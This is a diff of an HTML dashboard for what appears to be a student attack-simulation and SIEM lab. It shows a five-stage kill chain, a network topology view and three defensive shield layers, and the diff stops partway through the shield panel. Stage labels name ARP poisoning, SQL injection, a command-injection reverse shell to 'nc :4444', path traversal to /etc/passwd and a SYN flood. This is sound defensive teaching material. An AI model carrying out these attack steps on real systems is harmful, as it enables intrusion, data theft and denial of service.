@@ -3,35 +3,71 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>PBL4 - GOD-VIEW SIEM & FIREWALL MONITOR</title>
-  
-  <!-- Google Fonts: Orbitron & Rajdhani & Share Tech Mono -->
+  <title>PBL4 · GOD-VIEW SIEM &amp; FIREWALL MONITOR (Protocol Explorer Blueprint)</title>
+
+  <!-- Google Fonts: JetBrains Mono & IBM Plex Sans -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Rajdhani:wght@500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
-  
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;0,700;1,700&family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,800&display=swap" rel="stylesheet">
+
   <link rel="stylesheet" href="style.css">
 </head>
-<body class="cyber-theme">
-  <!-- Scanline CRT Effect Overlay -->
+<body class="cyber-theme protocol-explorer-theme" data-active-workspace="topology">
   <div class="scanlines"></div>
   <div class="grid-overlay"></div>
 
-  <!-- TOP HEADER BAR -->
+  <!-- =========================================================================
+       TOPBAR (Protocol Explorer Header + Workspace Switcher Tabs + Live Metrics)
+       ========================================================================= -->
   <header class="header-bar">
     <div class="header-left">
-      <div class="cyber-badge">SIEM CORE v1.0</div>
+      <!-- Protocol Explorer Corner-Bracketed Isometric Cube Logo -->
+      <div class="pe-logo-frame" aria-hidden="true">
+        <span class="pe-corner tl"></span>
+        <span class="pe-corner tr"></span>
+        <span class="pe-corner bl"></span>
+        <span class="pe-corner br"></span>
+        <svg class="pe-logo-cube" viewBox="0 0 64 64">
+          <g fill="#0B3AA8" stroke="#FDFDFE" stroke-width="2.4" stroke-linejoin="round">
+            <path d="M32 3 L58 16.5 L32 30 L6 16.5 Z"></path>
+            <path d="M6 16.5 L32 30 L32 45.5 L6 32 Z"></path>
+            <path d="M58 16.5 L32 30 L32 45.5 L58 32 Z"></path>
+            <path d="M6 32 L32 45.5 L32 61 L6 47.5 Z"></path>
+            <path d="M58 32 L32 45.5 L32 61 L58 47.5 Z"></path>
+          </g>
+        </svg>
+      </div>
       <div class="header-title-group">
-        <h1 class="header-title">PBL4 - GOD-VIEW SIEM & FIREWALL MONITOR</h1>
-        <div class="header-sub">CYBER ATTACK SIMULATION & TELEMETRY INGESTION HUB</div>
+        <div class="header-title-row">
+          <h1 class="header-title">PROTOCOL <em>SIEM</em></h1>
+          <span class="cyber-badge">GOD-VIEW v1.0</span>
+        </div>
+        <div class="header-sub">NETWORK PROTOCOL ANALYZER &amp; TELEMETRY INGESTION HUB</div>
       </div>
     </div>
 
+    <!-- WORKSPACE VIEW TABS (Tab 1: Main Topology & Defense | Tab 2: Deep L2/L4 & OS/L7 Telemetry | Tab 3: All Panels) -->
+    <nav class="pe-workspace-tabs" role="tablist" aria-label="Chuyển đổi không gian làm việc">
+      <button type="button" class="pe-ws-tab is-active" role="tab" aria-selected="true" data-ws-target="topology">
+        <svg viewBox="0 0 16 16" width="13" height="13" fill="none" stroke="currentColor" stroke-width="1.7"><polygon points="8 2 14.5 5.5 8 9 1.5 5.5 8 2"/><polyline points="1.5 8.5 8 12 14.5 8.5"/><polyline points="1.5 11.5 8 15 14.5 11.5"/></svg>
+        <span>TOPOLOGY &amp; DEFENSE</span>
+      </button>
+      <button type="button" class="pe-ws-tab" role="tab" aria-selected="false" data-ws-target="telemetry">
+        <svg viewBox="0 0 16 16" width="13" height="13" fill="none" stroke="currentColor" stroke-width="1.7"><rect x="1.5" y="2" width="13" height="5" rx="1"/><rect x="1.5" y="9" width="13" height="5" rx="1"/><line x1="4.5" y1="4.5" x2="8" y2="4.5"/><line x1="4.5" y1="11.5" x2="10" y2="11.5"/></svg>
+        <span>L2/L4 &amp; OS/L7 INSPECTOR</span>
+        <span class="pe-ws-tab-count">6 PANELS</span>
+      </button>
+      <button type="button" class="pe-ws-tab" role="tab" aria-selected="false" data-ws-target="all">
+        <svg viewBox="0 0 16 16" width="13" height="13" fill="none" stroke="currentColor" stroke-width="1.7"><rect x="1.5" y="1.5" width="5.5" height="5.5" rx="1"/><rect x="9" y="1.5" width="5.5" height="5.5" rx="1"/><rect x="1.5" y="9" width="5.5" height="5.5" rx="1"/><rect x="9" y="9" width="5.5" height="5.5" rx="1"/></svg>
+        <span>FULL VIEW</span>
+      </button>
+    </nav>
+
     <!-- Alert Warning Banner (Dynamic) -->
     <div id="warning-banner" class="warning-banner hidden">
-      <div class="warning-siren">⚠️</div>
+      <div class="warning-siren">!</div>
       <div class="warning-text">
-        <span class="warning-label">CRITICAL ATTACK DETECTED:</span>
+        <span class="warning-label">ALERT:</span>
         <span id="warning-details">SQL_INJECTION FROM 172.20.0.66 -> /api/login</span>
       </div>
       <button id="btn-dismiss-warning" class="btn-icon">✕</button>
@@ -43,27 +79,27 @@
         <span id="socket-status-text">DISCONNECTED</span>
       </div>
       <div class="metric-pill">
-        <span class="pill-label">RTT:</span>
+        <span class="pill-label">RTT</span>
         <span id="rtt-value" class="pill-value">-- ms</span>
       </div>
       <div class="metric-pill" title="Tối ưu hiệu năng gom nhóm sự kiện rAF Throttling & Giới hạn hạt Canvas (W6-T1)">
-        <span class="pill-label">UI ENGINE:</span>
-        <span id="fps-throttle-badge" class="pill-value">60 FPS · THROTTLED</span>
+        <span class="pill-label">ENGINE</span>
+        <span id="fps-throttle-badge" class="pill-value">60 FPS</span>
       </div>
       <div class="metric-pill">
-        <span class="pill-label">BUFFER:</span>
+        <span class="pill-label">BUFFER</span>
         <span id="buffer-count-badge" class="pill-value">0 / 300</span>
       </div>
       <button id="btn-reset-state" class="cyber-btn btn-danger" title="W6-T1: Khôi phục trạng thái sạch toàn Lab (Mạng ARP/SYN, HĐH Reverse Shell/lsof, Target App SQLite/Rate-Limit & 3 Lớp Khiên) trong 1 chạm (<3s)">
         <span class="btn-glow"></span>
-        ⚡ RESET LAB 1-CHẠM
+        RESET LAB
       </button>
     </div>
   </header>
 
   <!-- W6-T1: 1-TOUCH LAB RESET CONFIRMATION BANNER -->
   <div id="reset-toast-banner" class="reset-toast-banner hidden" role="status" aria-live="polite">
-    <div class="reset-toast-icon">✅</div>
+    <div class="reset-toast-icon">✓</div>
     <div class="reset-toast-body">
       <strong id="reset-toast-title">1-TOUCH LAB RESET COMPLETED</strong>
       <span id="reset-toast-details">Toàn bộ Mạng (ARP/SYN), HĐH (Reverse Shell/lsof), Target App (SQLite/RateLimit) &amp; 3 Lớp Khiên đã về trạng thái sạch ban đầu.</span>
@@ -71,545 +107,605 @@
     <button id="btn-dismiss-reset-toast" class="btn-icon">✕</button>
   </div>
 
-  <!-- MAIN DASHBOARD CONTENT -->
+  <!-- =========================================================================
+       MAIN WORKSPACE (Protocol Explorer Clean 3-Column + Bottom Packet Flow)
+       ========================================================================= -->
   <main class="main-layout">
 
-    <!-- W6-ALL & W6-T1: MULTI-LAYER KILL CHAIN LIVE ORCHESTRATOR & STRESS TEST BAR -->
-    <section class="card killchain-card" id="killchain-card" aria-label="Chuỗi Tấn Công Liên Hoàn Kill Chain 5 Giai Đoạn">
-      <div class="card-header">
-        <div class="card-title">
-          <span class="neon-icon">⛓️</span> MULTI-LAYER CYBER KILL CHAIN ORCHESTRATOR <small>(W6-ALL · L2 &rarr; L7 &rarr; OS &rarr; EXFIL &rarr; L4 SYN FLOOD)</small>
-        </div>
-        <div class="killchain-controls">
-          <span id="killchain-status-badge" class="badge badge-normal">KILL CHAIN: STANDBY</span>
-          <button id="btn-run-killchain" class="cyber-btn btn-sm btn-killchain-play" title="Tự động chạy liên hoàn 5 giai đoạn tấn công đa tầng để kiểm chứng Phễu Phòng Thủ 3 Lớp">
-            ▶ AUTO-PLAY KILL CHAIN (5 STAGES)
-          </button>
-          <button id="btn-stress-syn-burst" class="cyber-btn btn-sm btn-stress-burst" title="W6-T1: Bắn bão 120 gói SYN Flood tốc độ cao để kiểm chứng rAF Event Throttling không làm đơ trình duyệt">
-            🌊 STRESS TEST SYN BURST (120 PKTS)
-          </button>
-          <button id="btn-enable-all-shields" class="cyber-btn btn-sm btn-all-shields" title="Bật đồng thời cả 3 Lớp Khiên (L1 + L2 + L3) để chặn đứng toàn bộ Kill Chain">
-            🛡️ ENABLE ALL 3 SHIELDS
-          </button>
-        </div>
-      </div>
+    <!-- WORKSPACE VIEW 1: PROTOCOL EXPLORER 3-COLUMN STAGE (LEFT KILL CHAIN | CENTER TOPOLOGY | RIGHT DEFENSE & TCP) -->
+    <div class="pe-primary-stage" id="ws-pane-topology">
 
-      <div class="killchain-stepper" id="killchain-stepper">
-        <!-- Stage 1 -->
-        <div class="kc-stage" id="kc-stage-1" data-stage="1">
-          <div class="kc-stage-top">
-            <span class="kc-stage-num">STAGE 1 · L2 NET</span>
-            <span class="kc-stage-pill" id="kc-pill-1">IDLE</span>
-          </div>
-          <div class="kc-stage-title">① Recon &amp; ARP MitM</div>
-          <div class="kc-stage-desc" id="kc-desc-1">ARP Poisoning &amp; HTTP Credential Sniffer</div>
-          <div class="kc-stage-footer">
-            <span class="kc-shield-hint">Shield: <code>L1 Static ARP</code></span>
-            <button class="btn-kc-step" data-kc-trigger="1">Run S1</button>
-          </div>
-        </div>
-
-        <!-- Stage 2 -->
-        <div class="kc-stage" id="kc-stage-2" data-stage="2">
-          <div class="kc-stage-top">
-            <span class="kc-stage-num">STAGE 2 · L7 APP</span>
-            <span class="kc-stage-pill" id="kc-pill-2">IDLE</span>
-          </div>
-          <div class="kc-stage-title">② SQLi &amp; Brute-Force</div>
-          <div class="kc-stage-desc" id="kc-desc-2">1 req/s L1 Bypass &amp; SQLi Admin Auth</div>
-          <div class="kc-stage-footer">
-            <span class="kc-shield-hint">Shield: <code>L3 SQL/RateLimit</code></span>
-            <button class="btn-kc-step" data-kc-trigger="2">Run S2</button>
-          </div>
-        </div>
-
-        <!-- Stage 3 -->
-        <div class="kc-stage" id="kc-stage-3" data-stage="3">
-          <div class="kc-stage-top">
-            <span class="kc-stage-num">STAGE 3 · OS SHELL</span>
-            <span class="kc-stage-pill" id="kc-pill-3">IDLE</span>
-          </div>
-          <div class="kc-stage-title">③ OS Reverse Shell</div>
-          <div class="kc-stage-desc" id="kc-desc-3">Cmd Injection &rarr; <code>/bin/sh &rarr; nc :4444</code></div>
-          <div class="kc-stage-footer">
-            <span class="kc-shield-hint">Shield: <code>L3 Sanitizer / L2 OS</code></span>
-            <button class="btn-kc-step" data-kc-trigger="3">Run S3</button>
-          </div>
-        </div>
-
-        <!-- Stage 4 -->
-        <div class="kc-stage" id="kc-stage-4" data-stage="4">
-          <div class="kc-stage-top">
-            <span class="kc-stage-num">STAGE 4 · EXFIL</span>
-            <span class="kc-stage-pill" id="kc-pill-4">IDLE</span>
-          </div>
-          <div class="kc-stage-title">④ Data Exfiltration</div>
-          <div class="kc-stage-desc" id="kc-desc-4">Path Traversal <code>/etc/passwd</code> &amp; R&amp;D Flag</div>
-          <div class="kc-stage-footer">
-            <span class="kc-shield-hint">Shield: <code>L3 Path Sanitizer</code></span>
-            <button class="btn-kc-step" data-kc-trigger="4">Run S4</button>
-          </div>
-        </div>
-
-        <!-- Stage 5 -->
-        <div class="kc-stage" id="kc-stage-5" data-stage="5">
-          <div class="kc-stage-top">
-            <span class="kc-stage-num">STAGE 5 · L4/OS DoS</span>
-            <span class="kc-stage-pill" id="kc-pill-5">IDLE</span>
-          </div>
-          <div class="kc-stage-title">⑤ SYN Flood + FD + RST</div>
-          <div class="kc-stage-desc" id="kc-desc-5"><code>SYN_RECV</code> Flood, <code>lsof</code> EMFILE &amp; TCP RST</div>
-          <div class="kc-stage-footer">
-            <span class="kc-shield-hint">Shield: <code>L1 iptables + L2 Kernel</code></span>
-            <button class="btn-kc-step" data-kc-trigger="5">Run S5</button>
-          </div>
-        </div>
-      </div>
-    </section>
-    
-    <!-- TOP ROW: TOPOLOGY STREAM + DEFENSE SIDE PANEL -->
-    <div class="top-section">
-      
-      <!-- TOPOLOGY STREAM CANVAS -->
-      <section class="card topology-card">
+      <!-- LEFT SIDEBAR: KILL CHAIN 5-STAGE VERTICAL STEPPER (Like Protocol Explorer Left Steps Panel) -->
+      <section class="card killchain-card" id="killchain-card" aria-label="Chuỗi Tấn Công Liên Hoàn Kill Chain 5 Giai Đoạn">
         <div class="card-header">
           <div class="card-title">
-            <span class="neon-icon">⚡</span> NETWORK TOPOLOGY & PACKET FLOW STREAM
+            KILL CHAIN STAGES
           </div>
           <div class="card-badges">
-            <span class="badge badge-normal">NORMAL (GREEN)</span>
-            <span class="badge badge-attack">ATTACK (RED)</span>
-            <span id="mitm-badge-indicator" class="badge badge-mitm hidden">⚠️ MITM: REROUTED VIA HACKER</span>
-            <span id="rst-badge-indicator" class="badge badge-rst hidden">⚡ TCP RST: SESSION BROKEN</span>
-            <span id="revshell-badge-indicator" class="badge badge-revshell hidden">🐚 REVERSE SHELL: SERVER &rarr; HACKER (:4444)</span>
-            <span id="shield-l1-badge" class="badge badge-shield inactive" title="Khiên Mạng L1 (Static ARP & iptables)">L1 NET: OFF</span>
-            <span id="shield-l2-badge" class="badge badge-shield inactive" title="Khiên HĐH L2 (Syncookies, ulimit & nologin)">L2 OS: OFF</span>
-            <span id="shield-badge-indicator" class="badge badge-shield inactive" title="Khiên Ứng dụng L3/L7 (SQLi, Rate Limit, Sanitizer)">L3 APP: UNKNOWN</span>
+            <span id="killchain-status-badge" class="badge badge-normal">STANDBY</span>
           </div>
         </div>
 
-        <div class="canvas-container" id="canvas-wrapper">
-          <!-- HTML5 Canvas for real-time particle animation -->
-          <canvas id="topology-canvas"></canvas>
+        <div class="killchain-toolbar">
+          <button id="btn-run-killchain" class="cyber-btn btn-sm btn-killchain-play" title="Tự động chạy liên hoàn 5 giai đoạn tấn công đa tầng để kiểm chứng Phễu Phòng Thủ 3 Lớp">
+            ▶ AUTO-PLAY 5 STAGES
+          </button>
+          <button id="btn-stress-syn-burst" class="cyber-btn btn-sm btn-stress-burst" title="W6-T1: Bắn bão 120 gói SYN Flood tốc độ cao để kiểm chứng rAF Event Throttling không làm đơ trình duyệt">
+            SYN BURST (120)
+          </button>
+          <button id="btn-enable-all-shields" class="cyber-btn btn-sm btn-all-shields" title="Bật đồng thời cả 3 Lớp Khiên (L1 + L2 + L3) để chặn đứng toàn bộ Kill Chain">
+            ENABLE ALL 3 SHIELDS
+          </button>
+        </div>
 
-          <!-- Interactive Node Cards positioned on canvas -->
-          <div class="topology-nodes">
-            <!-- Node 1: Client -->
-            <div class="topo-node client-node" id="node-client">
-              <div class="node-icon">💻</div>
-              <div class="node-content">
-                <div class="node-role">CLIENT NODE</div>
-                <div class="node-name">Legitimate User</div>
-                <div class="node-ip">192.168.1.10 <small>(172.20.0.10)</small></div>
-                <div class="node-status" id="client-status">IDLE</div>
+        <div class="killchain-stepper" id="killchain-stepper">
+          <!-- Stage 1 -->
+          <div class="kc-stage" id="kc-stage-1" data-stage="1">
+            <div class="kc-step-circle">1</div>
+            <div class="kc-step-body">
+              <div class="kc-stage-top">
+                <span class="kc-stage-num">L2 NETWORK</span>
+                <span class="kc-stage-pill" id="kc-pill-1">IDLE</span>
+              </div>
+              <div class="kc-stage-title">RECON &amp; ARP MITM</div>
+              <div class="kc-stage-desc" id="kc-desc-1">ARP Poisoning &amp; HTTP Credential Sniffer</div>
+              <div class="kc-stage-footer">
+                <span class="kc-shield-hint">Shield: <code>L1 Static ARP</code></span>
+                <button class="btn-kc-step" data-kc-trigger="1">STEP 1</button>
               </div>
             </div>
+          </div>
 
-            <!-- Node 2: Target Server (Protected by 3-Layer Defense Funnel W5-T1) -->
-            <div class="topo-node server-node" id="node-server">
-              <!-- Outer Ring 1: L1 Network Shield (Static ARP + iptables) -->
-              <div class="shield-ring shield-ring-l1 inactive" id="shield-aura-l1">
-                <div class="shield-label shield-label-l1">L1: NETWORK SHIELD</div>
+          <!-- Stage 2 -->
+          <div class="kc-stage" id="kc-stage-2" data-stage="2">
+            <div class="kc-step-circle">2</div>
+            <div class="kc-step-body">
+              <div class="kc-stage-top">
+                <span class="kc-stage-num">L7 APPLICATION</span>
+                <span class="kc-stage-pill" id="kc-pill-2">IDLE</span>
               </div>
-              <!-- Middle Ring 2: L2 OS & Kernel Shield (syncookies + ulimit/cgroups + nologin) -->
-              <div class="shield-ring shield-ring-l2 inactive" id="shield-aura-l2">
-                <div class="shield-label shield-label-l2">L2: OS &amp; KERNEL SHIELD</div>
-              </div>
-              <!-- Inner Ring 3: L3 Application Shield (Prepared SQL + Rate Limit + Sanitizer) -->
-              <div class="shield-aura shield-ring-l3 inactive" id="shield-aura">
-                <div class="shield-energy-grid"></div>
-                <div class="shield-label shield-label-l3">L3: APP SHIELD (L7)</div>
-              </div>
-              <div class="node-icon">🛡️</div>
-              <div class="node-content">
-                <div class="node-role">TARGET SERVER</div>
-                <div class="node-name">Web Store & API</div>
-                <div class="node-ip">192.168.1.100 <small>(172.20.0.20)</small></div>
-                <div class="node-status" id="server-status">ONLINE (PORT 8000)</div>
+              <div class="kc-stage-title">SQLI &amp; BRUTE-FORCE</div>
+              <div class="kc-stage-desc" id="kc-desc-2">1 req/s L1 Bypass &amp; SQLi Admin Auth</div>
+              <div class="kc-stage-footer">
+                <span class="kc-shield-hint">Shield: <code>L3 SQL/RateLimit</code></span>
+                <button class="btn-kc-step" data-kc-trigger="2">STEP 2</button>
               </div>
             </div>
+          </div>
 
-            <!-- Node 3: Hacker / Attacker -->
-            <div class="topo-node hacker-node" id="node-hacker">
-              <div class="node-icon">💀</div>
-              <div class="node-content">
-                <div class="node-role">HACKER NODE</div>
-                <div class="node-name">Adversary CLI/API</div>
-                <div class="node-ip">192.168.1.200 <small>(172.20.0.66)</small></div>
-                <div class="node-status" id="hacker-status">STANDBY</div>
+          <!-- Stage 3 -->
+          <div class="kc-stage" id="kc-stage-3" data-stage="3">
+            <div class="kc-step-circle">3</div>
+            <div class="kc-step-body">
+              <div class="kc-stage-top">
+                <span class="kc-stage-num">OS SHELL</span>
+                <span class="kc-stage-pill" id="kc-pill-3">IDLE</span>
+              </div>
+              <div class="kc-stage-title">OS REVERSE SHELL</div>
+              <div class="kc-stage-desc" id="kc-desc-3">Cmd Injection &rarr; <code>/bin/sh &rarr; nc :4444</code></div>
+              <div class="kc-stage-footer">
+                <span class="kc-shield-hint">Shield: <code>L3 Sanitizer / L2 OS</code></span>
+                <button class="btn-kc-step" data-kc-trigger="3">STEP 3</button>
+              </div>
+            </div>
+          </div>
+
+          <!-- Stage 4 -->
+          <div class="kc-stage" id="kc-stage-4" data-stage="4">
+            <div class="kc-step-circle">4</div>
+            <div class="kc-step-body">
+              <div class="kc-stage-top">
+                <span class="kc-stage-num">EXFILTRATION</span>
+                <span class="kc-stage-pill" id="kc-pill-4">IDLE</span>
+              </div>
+              <div class="kc-stage-title">DATA EXFILTRATION</div>
+              <div class="kc-stage-desc" id="kc-desc-4">Path Traversal <code>/etc/passwd</code> &amp; R&amp;D Flag</div>
+              <div class="kc-stage-footer">
+                <span class="kc-shield-hint">Shield: <code>L3 Path Sanitizer</code></span>
+                <button class="btn-kc-step" data-kc-trigger="4">STEP 4</button>
+              </div>
+            </div>
+          </div>
+
+          <!-- Stage 5 -->
+          <div class="kc-stage" id="kc-stage-5" data-stage="5">
+            <div class="kc-step-circle">5</div>
+            <div class="kc-step-body">
+              <div class="kc-stage-top">
+                <span class="kc-stage-num">L4 / OS DoS</span>
+                <span class="kc-stage-pill" id="kc-pill-5">IDLE</span>
+              </div>
+              <div class="kc-stage-title">SYN FLOOD + FD + RST</div>
+              <div class="kc-stage-desc" id="kc-desc-5"><code>SYN_RECV</code> Flood, <code>lsof</code> EMFILE &amp; TCP RST</div>
+              <div class="kc-stage-footer">
+                <span class="kc-shield-hint">Shield: <code>L1 iptables + L2 Kernel</code></span>
+                <button class="btn-kc-step" data-kc-trigger="5">STEP 5</button>
               </div>
             </div>
           </div>
         </div>
       </section>
 
-      <!-- SIDE PANEL: 3-LAYER SHIELD CONTROL PANEL (W5-T1) & TCP SOCKET METRICS -->
-      <aside class="card side-panel-card">
-        <div class="card-header">
-          <div class="card-title">
-            <span class="neon-icon">🛡️</span> 3-LAYER DEFENSE FUNNEL (W5-T1)
-          </div>
-          <div class="card-badges">
-            <span id="funnel-active-count" class="badge badge-shield inactive">0 / 3 SHIELDS</span>
-          </div>
-        </div>
+      <!-- CENTER + RIGHT TOP SECTION -->
+      <div class="top-section">
 
-        <div class="side-panel-content">
-          <!-- W5-T1: BẢNG ĐIỀU KHIỂN 3 LỚP KHIÊN CHẮN (KHIÊN MẠNG - KHIÊN HĐH - KHIÊN ỨNG DỤNG) -->
-          <div class="control-box shield-funnel-box" aria-label="Bảng điều khiển 3 Lớp Khiên Chắn">
-            <div class="control-header">
-              <span class="control-title">3-LAYER SHIELD CONTROL PANEL</span>
+        <!-- CENTER STAGE: ISOMETRIC NETWORK TOPOLOGY CANVAS (Clean Open Grid like Protocol Explorer) -->
+        <section class="card topology-card">
+          <div class="card-header">
+            <div class="card-title">
+              NETWORK TOPOLOGY
+            </div>
+            <div class="card-badges">
+              <span class="badge badge-normal">● NORMAL</span>
+              <span class="badge badge-attack">● ATTACK</span>
+              <span id="mitm-badge-indicator" class="badge badge-mitm hidden">MITM ACTIVE</span>
+              <span id="rst-badge-indicator" class="badge badge-rst hidden">TCP RST</span>
+              <span id="revshell-badge-indicator" class="badge badge-revshell hidden">REVERSE SHELL :4444</span>
+              <span id="shield-l1-badge" class="badge badge-shield inactive" title="Khiên Mạng L1 (Static ARP & iptables)">L1 NET: OFF</span>
+              <span id="shield-l2-badge" class="badge badge-shield inactive" title="Khiên HĐH L2 (Syncookies, ulimit & nologin)">L2 OS: OFF</span>
+              <span id="shield-badge-indicator" class="badge badge-shield inactive" title="Khiên Ứng dụng L3/L7 (SQLi, Rate Limit, Sanitizer)">L3 APP: UNKNOWN</span>
+            </div>
+          </div>
+
+          <div class="canvas-container" id="canvas-wrapper">
+            <!-- Protocol Explorer View Switch Pill & OSI Layer Chip Indicator -->
+            <div class="pe-view-switch" aria-hidden="true">
+              <span class="pe-view-pill is-active">
+                <svg viewBox="0 0 16 16" width="12" height="12" fill="none" stroke="currentColor" stroke-width="1.7"><polygon points="8 2 14.5 5.5 8 9 1.5 5.5 8 2"/><polyline points="1.5 8.5 8 12 14.5 8.5"/><polyline points="1.5 11.5 8 15 14.5 11.5"/></svg>
+                NETWORK
+              </span>
+              <span class="pe-view-pill">
+                <svg viewBox="0 0 16 16" width="12" height="12" fill="none" stroke="currentColor" stroke-width="1.7"><path d="M4 3v10M12 3v10M4 6h8M12 10H4"/></svg>
+                SEQUENCE
+              </span>
+            </div>
+
+            <div class="pe-osi-strip" aria-hidden="true">
+              <span class="pe-osi-title">OSI LAYER</span>
+              <span class="pe-osi-chip">2</span>
+              <span class="pe-osi-chip">3</span>
+              <span class="pe-osi-chip">4</span>
+              <span class="pe-osi-chip is-active">7</span>
+            </div>
+
+            <!-- HTML5 Canvas for real-time isometric grid, directional lanes & particle animation -->
+            <canvas id="topology-canvas"></canvas>
+
+            <!-- Isometric 3D Devices standing directly on the grid (No heavy box borders, exactly like Protocol Explorer) -->
+            <div class="topology-nodes">
+              <!-- Node 1: Client (Isometric Laptop Line-Art) -->
+              <div class="topo-node client-node" id="node-client">
+                <div class="node-icon pe-iso-device" aria-hidden="true">
+                  <svg class="node-svg-icon" viewBox="0 0 88 76" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <polygon points="10,56 44,40 78,56 44,72" fill="rgba(141, 154, 179, 0.22)"/>
+                    <polygon points="16,16 52,4 52,38 16,50" fill="#F8FBFF" stroke="#1B3FAE" stroke-width="2.2" stroke-linejoin="round"/>
+                    <polygon points="20,20 48,10 48,34 20,44" fill="#E3ECFC" stroke="#1B3FAE" stroke-width="1.5" stroke-linejoin="round"/>
+                    <line x1="25" y1="25" x2="37" y2="21" stroke="#0B3AA8" stroke-width="1.8" stroke-linecap="round"/>
+                    <line x1="25" y1="31" x2="42" y2="25" stroke="#3F74D6" stroke-width="1.6" stroke-linecap="round"/>
+                    <polygon points="16,50 52,38 76,50 40,62" fill="#EEF3FE" stroke="#1B3FAE" stroke-width="2.2" stroke-linejoin="round"/>
+                    <polygon points="16,50 40,62 40,67 16,55" fill="#DAE5FB" stroke="#1B3FAE" stroke-width="2" stroke-linejoin="round"/>
+                    <polygon points="40,62 76,50 76,55 40,67" fill="#C7D7F6" stroke="#1B3FAE" stroke-width="2" stroke-linejoin="round"/>
+                  </svg>
+                </div>
+                <div class="node-content">
+                  <div class="node-role">CLIENT NODE</div>
+                  <div class="node-name">Client</div>
+                  <div class="node-ip">172.20.0.10</div>
+                  <div class="node-status" id="client-status">IDLE</div>
+                </div>
+              </div>
+
+              <!-- Node 2: Target Server (Isometric Web Server Tower Cube) -->
+              <div class="topo-node server-node" id="node-server">
+                <div class="shield-ring shield-ring-l1 inactive" id="shield-aura-l1">
+                  <div class="shield-label shield-label-l1">L1: NETWORK SHIELD</div>
+                </div>
+                <div class="shield-ring shield-ring-l2 inactive" id="shield-aura-l2">
+                  <div class="shield-label shield-label-l2">L2: OS &amp; KERNEL SHIELD</div>
+                </div>
+                <div class="shield-aura shield-ring-l3 inactive" id="shield-aura">
+                  <div class="shield-energy-grid"></div>
+                  <div class="shield-label shield-label-l3">L3: APP SHIELD (L7)</div>
+                </div>
+                <div class="node-icon pe-iso-device" aria-hidden="true">
+                  <svg class="node-svg-icon" viewBox="0 0 88 86" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <polygon points="12,68 44,54 78,68 46,82" fill="rgba(141, 154, 179, 0.25)"/>
+                    <polygon points="44,8 74,23 44,38 14,23" fill="#F8FBFF" stroke="#1B3FAE" stroke-width="2.2" stroke-linejoin="round"/>
+                    <polygon points="14,23 44,38 44,76 14,61" fill="#EFF5FF" stroke="#1B3FAE" stroke-width="2.2" stroke-linejoin="round"/>
+                    <polygon points="44,38 74,23 74,61 44,76" fill="#D7E3FA" stroke="#1B3FAE" stroke-width="2.2" stroke-linejoin="round"/>
+                    <line x1="19" y1="33" x2="39" y2="43" stroke="#1B3FAE" stroke-width="1.8" stroke-linecap="round"/>
+                    <line x1="19" y1="43" x2="39" y2="53" stroke="#1B3FAE" stroke-width="1.8" stroke-linecap="round"/>
+                    <line x1="19" y1="53" x2="39" y2="63" stroke="#1B3FAE" stroke-width="1.8" stroke-linecap="round"/>
+                    <circle cx="22" cy="29" r="1.8" fill="#00A86B"/>
+                    <circle cx="22" cy="39" r="1.8" fill="#00A86B"/>
+                    <circle cx="22" cy="49" r="1.8" fill="#0B3AA8"/>
+                    <polygon points="51,42 66,34 66,58 51,66" fill="#C7D7F6" stroke="#1B3FAE" stroke-width="1.6" stroke-linejoin="round"/>
+                  </svg>
+                </div>
+                <div class="node-content">
+                  <div class="node-role">TARGET SERVER</div>
+                  <div class="node-name">Web Server</div>
+                  <div class="node-ip">172.20.0.20</div>
+                  <div class="node-status" id="server-status">ONLINE (:8000)</div>
+                </div>
+              </div>
+
+              <!-- Node 3: Hacker / Attacker (Isometric Router / Adversary Node) -->
+              <div class="topo-node hacker-node" id="node-hacker">
+                <div class="node-icon pe-iso-device" aria-hidden="true">
+                  <svg class="node-svg-icon" viewBox="0 0 88 80" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <polygon points="12,60 44,45 78,60 44,76" fill="rgba(141, 154, 179, 0.23)"/>
+                    <polygon points="44,24 74,39 44,54 14,39" fill="#F8FBFF" stroke="#1B3FAE" stroke-width="2.2" stroke-linejoin="round"/>
+                    <polygon points="14,39 44,54 44,68 14,53" fill="#EFF5FF" stroke="#1B3FAE" stroke-width="2.2" stroke-linejoin="round"/>
+                    <polygon points="44,54 74,39 74,53 44,68" fill="#D7E3FA" stroke="#1B3FAE" stroke-width="2.2" stroke-linejoin="round"/>
+                    <line x1="55" y1="32" x2="55" y2="10" stroke="#1B3FAE" stroke-width="2.4" stroke-linecap="round"/>
+                    <circle cx="55" cy="9" r="2.8" fill="#E04B55" stroke="#1B3FAE" stroke-width="1.5"/>
+                    <circle cx="22" cy="49" r="2.1" fill="#E04B55"/>
+                    <rect x="28" y="49" width="10" height="5" transform="skewY(26)" fill="#DAE5FB" stroke="#1B3FAE" stroke-width="1.3"/>
+                  </svg>
+                </div>
+                <div class="node-content">
+                  <div class="node-role">HACKER NODE</div>
+                  <div class="node-name">Adversary</div>
+                  <div class="node-ip">172.20.0.66</div>
+                  <div class="node-status" id="hacker-status">STANDBY</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- RIGHT PANEL: PROTOCOL OVERVIEW / 3-LAYER DEFENSE & TCP METRICS -->
+        <aside class="card side-panel-card">
+          <div class="card-header">
+            <div class="card-title">
+              DEFENSE OVERVIEW
+            </div>
+            <div class="card-badges">
+              <span id="funnel-active-count" class="badge badge-shield inactive">0 / 3 SHIELDS</span>
               <span id="defense-state-pill" class="pill-inactive">BYPASSED</span>
             </div>
-
-            <!-- LỚP 1: KHIÊN MẠNG (L1 - NETWORK L2/L4) -->
-            <div class="shield-layer-row layer-l1" id="shield-row-l1">
-              <div class="shield-layer-info">
-                <div class="shield-layer-top">
-                  <span class="shield-layer-name">① KHIÊN MẠNG (L1 · L2/L4)</span>
-                  <span id="defense-l1-pill" class="pill-inactive">BYPASSED</span>
-                </div>
-                <div class="shield-layer-tech">Static ARP · <code>iptables</code> SYN/RST Filter</div>
-              </div>
